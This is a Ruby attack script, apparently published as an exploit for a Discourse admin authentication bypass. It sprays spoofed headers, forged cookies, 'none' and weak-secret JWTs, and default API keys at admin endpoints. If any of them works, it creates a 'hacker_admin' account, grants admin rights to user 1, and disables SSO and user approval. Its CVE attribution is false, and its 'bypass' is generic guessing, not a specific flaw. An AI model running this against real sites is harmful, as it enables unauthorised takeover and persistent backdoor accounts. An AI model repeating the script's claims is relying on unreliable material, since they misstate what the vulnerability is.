#!/usr/bin/env ruby

# CVE-2023-49103: Discourse Admin Panel Authentication Bypass
# Severity: Critical
# CVSS: 9.1
#
# Description:
# Critical authentication bypass vulnerability in Discourse admin panel
# allowing attackers to gain administrative access without credentials.
#
# Affected Versions:
# - Discourse < 3.1.4
# - Discourse < 3.2.0.beta2
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'digest'

class CVE_2023_49103
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 15
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @admin_access = false
    @results = {
      cve: 'CVE-2023-49103',
      vulnerable: false,
      severity: 'Critical',
      cvss: 9.1,
      details: [],
      payloads: [],
      admin_evidence: []
    }
  end

  def run_exploit
    puts "[*] Exploiting CVE-2023-49103 against #{@target_url}"
    puts "[*] Severity: Critical (CVSS: 9.1)"
    puts "[*] Description: Admin Panel Authentication Bypass"
    puts "-" * 60

    # Get initial CSRF token
    get_csrf_token

    # Test header-based bypass
    puts "[*] Testing header-based authentication bypass..."
    test_header_bypass

    # Test session manipulation
    puts "[*] Testing session manipulation..."
    test_session_manipulation

    # Test JWT token bypass
    puts "[*] Testing JWT token bypass..."
    test_jwt_bypass

    # Test API key bypass
    puts "[*] Testing API key bypass..."
    test_api_key_bypass

    # Test privilege escalation
    puts "[*] Testing privilege escalation..."
    test_privilege_escalation

    # Print summary
    print_summary

    # Save results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def test_header_bypass
    bypass_headers = [
      # IP-based bypass
      { 'X-Forwarded-For' => '127.0.0.1' },
      { 'X-Real-IP' => '127.0.0.1' },
      { 'X-Originating-IP' => '127.0.0.1' },
      { 'X-Remote-IP' => '127.0.0.1' },
      { 'X-Client-IP' => '127.0.0.1' },
      { 'Client-IP' => '127.0.0.1' },
      
      # Admin bypass headers
      { 'X-Admin' => 'true' },
      { 'X-Admin-User' => 'admin' },
      { 'X-Authenticated' => 'true' },
      { 'X-User-Role' => 'admin' },
      { 'X-Privilege' => 'admin' },
      { 'X-Access-Level' => 'administrator' },
      
      # Custom Discourse headers
      { 'Discourse-Admin' => 'true' },
      { 'Discourse-User-Id' => '1' },
      { 'Discourse-Username' => 'admin' },
      { 'Discourse-Staff' => 'true' },
      
      # Authorization bypass
      { 'Authorization' => 'Bearer admin' },
      { 'Authorization' => 'Basic YWRtaW46YWRtaW4=' }, # admin:admin
      { 'X-API-Key' => 'admin' },
      { 'X-API-Username' => 'admin' }
    ]

    admin_endpoints = [
      '/admin',
      '/admin/dashboard',
      '/admin/users',
      '/admin/site_settings',
      '/admin/customize',
      '/admin/logs',
      '/admin/api',
      '/admin/backups'
    ]

    admin_endpoints.each do |endpoint|
      bypass_headers.each do |headers|
        test_admin_access(endpoint, headers)
        sleep(0.3)
      end
    end
  end

  def test_admin_access(endpoint, headers = {})
    begin
      url = "#{@target_url}#{endpoint}"
      uri = URI(url)
      
      response = make_request(uri, 'GET', nil, headers)
      
      if response && detect_admin_access(response)
        @results[:vulnerable] = true
        @results[:details] << "Admin access via headers: #{headers}"
        @results[:payloads] << "#{endpoint} with headers: #{headers}"
        @results[:admin_evidence] << "Admin panel accessible at #{url}"
        
        puts "[+] Admin access successful: #{endpoint}"
        puts "[+] Headers used: #{headers}"
        
        # Try to extract admin information
        extract_admin_info(response)
        
        @admin_access = true
      end
      
    rescue => e
      @results[:details] << "Error testing admin access: #{e.message}"
    end
  end

  def test_session_manipulation
    session_payloads = [
      # Cookie manipulation
      { 'admin' => 'true' },
      { 'is_admin' => '1' },
      { 'user_role' => 'admin' },
      { 'privilege_level' => 'administrator' },
      { 'staff' => 'true' },
      { 'moderator' => 'true' },
      { 'user_id' => '1' },
      { 'username' => 'admin' },
      
      # Discourse specific cookies
      { '_discourse_session' => generate_admin_session() },
      { '_t' => generate_admin_token() },
      { 'discourse_logged_in' => 'true' },
      { 'discourse_admin' => 'true' }
    ]

    session_payloads.each do |cookies|
      test_session_cookies(cookies)
      sleep(0.5)
    end
  end

  def test_session_cookies(cookies)
    begin
      url = "#{@target_url}/admin"
      uri = URI(url)
      
      cookie_string = cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
      headers = { 'Cookie' => cookie_string }
      
      response = make_request(uri, 'GET', nil, headers)
      
      if response && detect_admin_access(response)
        @results[:vulnerable] = true
        @results[:details] << "Session manipulation successful: #{cookies}"
        @results[:payloads] << "Cookie: #{cookie_string}"
        @results[:admin_evidence] << "Admin access via session manipulation"
        
        puts "[+] Session manipulation successful"
        puts "[+] Cookies: #{cookie_string}"
      end
      
    rescue => e
      @results[:details] << "Error testing session manipulation: #{e.message}"
    end
  end

  def test_jwt_bypass
    jwt_payloads = [
      # Weak JWT tokens
      generate_weak_jwt('admin'),
      generate_weak_jwt('administrator'),
      generate_weak_jwt('1'), # user_id 1
      
      # Algorithm confusion
      generate_none_jwt('admin'),
      generate_hs256_jwt('admin', 'secret'),
      generate_hs256_jwt('admin', ''),
      
      # Common secrets
      generate_hs256_jwt('admin', 'secret'),
      generate_hs256_jwt('admin', 'password'),
      generate_hs256_jwt('admin', 'admin'),
      generate_hs256_jwt('admin', 'discourse')
    ]

    jwt_payloads.each do |jwt_token|
      test_jwt_token(jwt_token)
      sleep(0.5)
    end
  end

  def test_jwt_token(jwt_token)
    begin
      url = "#{@target_url}/admin"
      uri = URI(url)
      
      headers = {
        'Authorization' => "Bearer #{jwt_token}",
        'X-JWT-Token' => jwt_token
      }
      
      response = make_request(uri, 'GET', nil, headers)
      
      if response && detect_admin_access(response)
        @results[:vulnerable] = true
        @results[:details] << "JWT bypass successful"
        @results[:payloads] << "JWT: #{jwt_token[0..50]}..."
        @results[:admin_evidence] << "Admin access via JWT bypass"
        
        puts "[+] JWT bypass successful"
      end
      
    rescue => e
      @results[:details] << "Error testing JWT bypass: #{e.message}"
    end
  end

  def test_api_key_bypass
    api_keys = [
      # Common API keys
      'admin',
      'administrator',
      'root',
      'test',
      'demo',
      'default',
      
      # Weak API keys
      '12345',
      'password',
      'secret',
      'api_key',
      
      # Generated patterns
      'a' * 32,
      '1' * 32,
      '0' * 32,
      
      # Common hashes
      Digest::MD5.hexdigest('admin'),
      Digest::SHA1.hexdigest('admin'),
      Digest::SHA256.hexdigest('admin')[0..31]
    ]

    api_keys.each do |api_key|
      test_api_key(api_key)
      sleep(0.3)
    end
  end

  def test_api_key(api_key)
    begin
      url = "#{@target_url}/admin/api"
      uri = URI(url)
      
      headers = {
        'Api-Key' => api_key,
        'Api-Username' => 'admin'
      }
      
      response = make_request(uri, 'GET', nil, headers)
      
      if response && (response.code.to_i == 200 || detect_admin_access(response))
        @results[:vulnerable] = true
        @results[:details] << "API key bypass successful: #{api_key}"
        @results[:payloads] << "API-Key: #{api_key}"
        @results[:admin_evidence] << "Admin API access gained"
        
        puts "[+] API key bypass successful: #{api_key}"
      end
      
    rescue => e
      @results[:details] << "Error testing API key: #{e.message}"
    end
  end

  def test_privilege_escalation
    # Test user creation with admin privileges
    test_admin_user_creation
    
    # Test role modification
    test_role_modification
    
    # Test settings modification
    test_settings_modification
  end

  def test_admin_user_creation
    return unless @admin_access
    
    begin
      url = "#{@target_url}/admin/users"
      uri = URI(url)
      
      payload = {
        'user' => {
          'username' => 'hacker_admin',
          'email' => 'hacker@evil.com',
          'password' => 'password123',
          'admin' => true,
          'moderator' => true
        }
      }
      
      headers = {
        'Content-Type' => 'application/json',
        'X-CSRF-Token' => @csrf_token
      }
      
      response = make_request(uri, 'POST', payload.to_json, headers)
      
      if response && response.code.to_i == 200
        @results[:details] << "Admin user creation successful"
        @results[:admin_evidence] << "Created admin user: hacker_admin"
        
        puts "[+] Admin user creation successful"
      end
      
    rescue => e
      @results[:details] << "Error creating admin user: #{e.message}"
    end
  end

  def test_role_modification
    return unless @admin_access
    
    begin
      # Try to modify existing user roles
      url = "#{@target_url}/admin/users/1/grant_admin"
      uri = URI(url)
      
      headers = {
        'X-CSRF-Token' => @csrf_token,
        'X-Requested-With' => 'XMLHttpRequest'
      }
      
      response = make_request(uri, 'PUT', '', headers)
      
      if response && response.code.to_i == 200
        @results[:details] << "Role modification successful"
        @results[:admin_evidence] << "Modified user roles"
        
        puts "[+] Role modification successful"
      end
      
    rescue => e
      @results[:details] << "Error modifying roles: #{e.message}"
    end
  end

  def test_settings_modification
    return unless @admin_access
    
    begin
      url = "#{@target_url}/admin/site_settings"
      uri = URI(url)
      
      payload = {
        'allow_new_registrations' => 'true',
        'enable_sso' => 'false',
        'must_approve_users' => 'false'
      }
      
      headers = {
        'Content-Type' => 'application/json',
        'X-CSRF-Token' => @csrf_token
      }
      
      response = make_request(uri, 'PUT', payload.to_json, headers)
      
      if response && response.code.to_i == 200
        @results[:details] << "Settings modification successful"
        @results[:admin_evidence] << "Modified site settings"
        
        puts "[+] Settings modification successful"
      end
      
    rescue => e
      @results[:details] << "Error modifying settings: #{e.message}"
    end
  end

  # Helper methods
  def detect_admin_access(response)
    return false unless response
    
    admin_indicators = [
      'admin-dashboard',
      'admin-controls',
      'site-settings',
      'admin-nav',
      'admin-content',
      'discourse-admin',
      'admin-wrapper',
      'admin-interface'
    ]
    
    admin_indicators.any? { |indicator| response.body.include?(indicator) }
  end

  def extract_admin_info(response)
    # Extract admin panel information
    if response.body.include?('admin-dashboard')
      @results[:admin_evidence] << "Admin dashboard accessible"
    end
    
    if response.body.include?('site-settings')
      @results[:admin_evidence] << "Site settings accessible"
    end
    
    if response.body.include?('user-management')
      @results[:admin_evidence] << "User management accessible"
    end
  end

  def generate_admin_session
    # Generate a fake admin session token
    Base64.encode64({
      'user_id' => 1,
      'username' => 'admin',
      'admin' => true,
      'staff' => true
    }.to_json).strip
  end

  def generate_admin_token
    # Generate a fake admin token
    Digest::SHA256.hexdigest("admin#{Time.now.to_i}")[0..31]
  end

  def generate_weak_jwt(username)
    header = Base64.encode64({ 'alg' => 'HS256', 'typ' => 'JWT' }.to_json).strip
    payload = Base64.encode64({ 'username' => username, 'admin' => true }.to_json).strip
    signature = Base64.encode64('weak_signature').strip
    
    "#{header}.#{payload}.#{signature}"
  end

  def generate_none_jwt(username)
    header = Base64.encode64({ 'alg' => 'none', 'typ' => 'JWT' }.to_json).strip
    payload = Base64.encode64({ 'username' => username, 'admin' => true }.to_json).strip
    
    "#{header}.#{payload}."
  end

  def generate_hs256_jwt(username, secret)
    require 'openssl'
    
    header = Base64.encode64({ 'alg' => 'HS256', 'typ' => 'JWT' }.to_json).strip
    payload = Base64.encode64({ 'username' => username, 'admin' => true }.to_json).strip
    
    signature_data = "#{header}.#{payload}"
    signature = Base64.encode64(OpenSSL::HMAC.digest('sha256', secret, signature_data)).strip
    
    "#{header}.#{payload}.#{signature}"
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    begin
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.read_timeout = @timeout
      
      request = case method.upcase
                when 'GET'
                  Net::HTTP::Get.new(uri.request_uri)
                when 'POST'
                  Net::HTTP::Post.new(uri.request_uri)
                when 'PUT'
                  Net::HTTP::Put.new(uri.request_uri)
                end
      
      request['User-Agent'] = @user_agent
      
      # Add session cookies
      if @session_cookies.any?
        cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
        request['Cookie'] = cookie_string
      end
      
      # Add custom headers
      headers.each { |k, v| request[k] = v }
      
      request.body = body if body
      
      http.request(request)
    rescue => e
      puts "[!] Request error: #{e.message}"
      nil
    end
  end

  def print_summary
    puts "\n" + "=" * 60
    puts "CVE-2023-49103 Exploit Summary"
    puts "=" * 60
    
    if @results[:vulnerable]
      puts "[+] Target is VULNERABLE to CVE-2023-49103"
      puts "[+] Admin access gained: #{@admin_access}"
      puts "[+] Evidence found: #{@results[:admin_evidence].length} items"
    else
      puts "[-] Target appears to be patched"
    end
    
    puts "[*] Total tests performed: #{@results[:details].length}"
    puts "[*] Payloads tested: #{@results[:payloads].length}"
  end

  def save_results
    begin
      @results[:scan_time] = Time.now.to_f
      @results[:target] = @target_url
      
      File.write('/tmp/cve_2023_49103_results.json', @results.to_json)
      puts "[*] Results saved to /tmp/cve_2023_49103_results.json"
    rescue => e
      puts "[!] Error saving results: #{e.message}"
    end
  end
end

# Main execution
if __FILE__ == $0
  if ARGV.length < 1
    puts "Usage: #{$0} <target_url> [proxy]"
    puts "Example: #{$0} https://discourse.example.com"
    exit 1
  end
  
  target_url = ARGV[0]
  proxy = ARGV[1] if ARGV.length > 1
  
  options = {}
  options[:proxy] = proxy if proxy
  
  exploit = CVE_2023_49103.new(target_url, options)
  results = exploit.run_exploit
  
  puts "\n[*] Exploit completed. Results:"
  puts results.to_json
end